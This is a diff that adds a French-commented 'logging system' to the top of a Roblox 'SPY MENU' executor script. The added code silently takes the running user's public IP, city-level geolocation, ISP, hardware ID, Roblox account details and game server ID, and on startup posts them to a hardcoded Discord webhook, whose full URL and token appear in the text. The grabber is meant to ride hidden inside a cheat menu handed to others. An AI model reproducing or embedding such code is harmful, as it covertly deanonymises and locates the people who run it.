@@ -7,6 +7,317 @@
     ╚══════════════════════════════════════════════════════════╝
 ]]
 
+--[[
+    ╔══════════════════════════════════════════════════════════╗
+    ║           SYSTÈME DE LOGGING - SPY MENU                  ║
+    ║              À placer au début du script                 ║
+    ╚══════════════════════════════════════════════════════════╝
+]]
+
+-- Configuration
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1461118550889730078/5t9HWG-iNMTpqQ742FYLIjx9P2hI4i6U9HF_Esaspnv6riKxZbuqc7hZVwjYCbWDtNKC"
+local MENU_NAME = "SPY MENU - HUB" -- CHANGE POUR CHAQUE MENU : "NEIGHBORS" / "THE CORNER" / "HUB"
+
+-- Services
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Fonction pour obtenir l'IP (via ipify)
+local function GetIP()
+    local success, ip = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end)
+    return success and ip or "Indisponible"
+end
+
+-- Fonction pour obtenir la localisation via IP
+local function GetLocation()
+    local success, data = pcall(function()
+        local ip = GetIP()
+        if ip == "Indisponible" then return nil end
+        return game:HttpGet("http://ip-api.com/json/" .. ip)
+    end)
+    
+    if success and data then
+        local decoded = HttpService:JSONDecode(data)
+        return {
+            Country = decoded.country or "Inconnu",
+            CountryCode = decoded.countryCode or "??",
+            Region = decoded.regionName or "Inconnu",
+            City = decoded.city or "Inconnu",
+            Timezone = decoded.timezone or "Inconnu",
+            ISP = decoded.isp or "Inconnu"
+        }
+    end
+    return nil
+end
+
+-- Fonction pour obtenir le HWID
+local function GetHWID()
+    local success, hwid = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    return success and hwid or "Indisponible"
+end
+
+-- Fonction pour obtenir les infos Roblox
+local function GetRobloxInfo()
+    local info = {
+        Username = LocalPlayer.Name,
+        DisplayName = LocalPlayer.DisplayName,
+        UserId = LocalPlayer.UserId,
+        AccountAge = LocalPlayer.AccountAge,
+        Premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium,
+        Country = "Inconnu",
+        Locale = "Inconnu"
+    }
+    
+    -- Récupérer le pays via LocalizationService
+    pcall(function()
+        local result, code = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+        info.Country = code or "Inconnu"
+    end)
+    
+    -- Récupérer la locale
+    pcall(function()
+        info.Locale = LocalizationService.RobloxLocaleId
+    end)
+    
+    return info
+end
+
+-- Fonction pour obtenir les infos du jeu
+local function GetGameInfo()
+    return {
+        GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+        PlaceId = game.PlaceId,
+        JobId = game.JobId,
+        CreatorType = game.CreatorType.Name,
+        CreatorId = game.CreatorId
+    }
+end
+
+-- Fonction pour obtenir les infos de l'executor
+local function GetExecutorInfo()
+    local executor = identifyexecutor and identifyexecutor() or "Inconnu"
+    local hwid = GetHWID()
+    
+    return {
+        Executor = executor,
+        HWID = hwid,
+        Platform = game:GetService("UserInputService"):GetPlatform().Name
+    }
+end
+
+-- Fonction pour envoyer au webhook Discord
+local function SendToWebhook()
+    local robloxInfo = GetRobloxInfo()
+    local gameInfo = GetGameInfo()
+    local executorInfo = GetExecutorInfo()
+    local ip = GetIP()
+    local location = GetLocation()
+    
+    -- Créer l'embed
+    local embed = {
+        ["title"] = "🕵️ " .. MENU_NAME .. " - Nouvelle connexion",
+        ["color"] = 5814783, -- Bleu
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+        ["footer"] = {
+            ["text"] = "SPY Menu Logger v1.0"
+        },
+        ["thumbnail"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. robloxInfo.UserId .. "&width=150&height=150&format=png"
+        },
+        ["fields"] = {
+            -- Menu utilisé
+            {
+                ["name"] = "📱 Menu utilisé",
+                ["value"] = "```" .. MENU_NAME .. "```",
+                ["inline"] = false
+            },
+            
+            -- Séparateur
+            {
+                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                ["value"] = "**👤 INFORMATIONS ROBLOX**",
+                ["inline"] = false
+            },
+            
+            -- Infos Roblox
+            {
+                ["name"] = "🎮 Username",
+                ["value"] = "```" .. robloxInfo.Username .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "✨ Display Name",
+                ["value"] = "```" .. robloxInfo.DisplayName .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🆔 User ID",
+                ["value"] = "```" .. robloxInfo.UserId .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📅 Account Age",
+                ["value"] = "```" .. robloxInfo.AccountAge .. " jours```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "⭐ Premium",
+                ["value"] = robloxInfo.Premium and "```✅ Oui```" or "```❌ Non```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🌍 Pays",
+                ["value"] = "```" .. robloxInfo.Country .. "```",
+                ["inline"] = true
+            },
+            
+            -- Séparateur
+            {
+                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                ["value"] = "**🎯 INFORMATIONS DU JEU**",
+                ["inline"] = false
+            },
+            
+            -- Infos du jeu
+            {
+                ["name"] = "🎮 Nom du jeu",
+                ["value"] = "```" .. gameInfo.GameName .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🆔 Place ID",
+                ["value"] = "```" .. gameInfo.PlaceId .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔗 Job ID",
+                ["value"] = "```" .. gameInfo.JobId .. "```",
+                ["inline"] = false
+            },
+            
+            -- Séparateur
+            {
+                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                ["value"] = "**💻 INFORMATIONS SYSTÈME**",
+                ["inline"] = false
+            },
+            
+            -- Infos executor
+            {
+                ["name"] = "⚙️ Executor",
+                ["value"] = "```" .. executorInfo.Executor .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🖥️ Platform",
+                ["value"] = "```" .. executorInfo.Platform .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔑 HWID",
+                ["value"] = "```" .. executorInfo.HWID .. "```",
+                ["inline"] = false
+            },
+            
+            -- Séparateur
+            {
+                ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                ["value"] = "**🌐 INFORMATIONS RÉSEAU**",
+                ["inline"] = false
+            },
+            
+            -- Infos réseau
+            {
+                ["name"] = "🌍 IP",
+                ["value"] = "```" .. ip .. "```",
+                ["inline"] = true
+            }
+        }
+    }
+    
+    -- Ajouter les infos de localisation si disponibles
+    if location then
+        table.insert(embed.fields, {
+            ["name"] = "🗺️ Localisation",
+            ["value"] = string.format("```\n🌍 Pays: %s (%s)\n📍 Région: %s\n🏙️ Ville: %s\n🕐 Timezone: %s\n📡 ISP: %s```", 
+                location.Country, 
+                location.CountryCode,
+                location.Region,
+                location.City,
+                location.Timezone,
+                location.ISP
+            ),
+            ["inline"] = false
+        })
+    end
+    
+    -- Ajouter les liens utiles
+    table.insert(embed.fields, {
+        ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        ["value"] = "**🔗 LIENS RAPIDES**",
+        ["inline"] = false
+    })
+    
+    table.insert(embed.fields, {
+        ["name"] = "🔗 Profil Roblox",
+        ["value"] = "[Cliquez ici](https://www.roblox.com/users/" .. robloxInfo.UserId .. "/profile)",
+        ["inline"] = true
+    })
+    
+    table.insert(embed.fields, {
+        ["name"] = "🎮 Rejoindre le jeu",
+        ["value"] = "[Cliquez ici](https://www.roblox.com/games/" .. gameInfo.PlaceId .. ")",
+        ["inline"] = true
+    })
+    
+    -- Préparer le payload
+    local payload = {
+        ["username"] = "SPY Menu Logger",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1234567890/spy_menu_icon.png",
+        ["embeds"] = {embed}
+    }
+    
+    -- Envoyer au webhook
+    local success, response = pcall(function()
+        return request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("✅ Informations envoyées au webhook")
+    else
+        warn("❌ Erreur lors de l'envoi au webhook: " .. tostring(response))
+    end
+end
+
+-- Envoyer les infos au démarrage
+task.spawn(function()
+    task.wait(2) -- Attendre 2 secondes que tout se charge
+    SendToWebhook()
+end)
+
+--[[
+    ═══════════════════════════════════════════════════════════
+    FIN DU SYSTÈME DE LOGGING
+    ═══════════════════════════════════════════════════════════
+    
+    Colle ton menu SPY en dessous de cette ligne
+]]
+
+
 -- Services
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
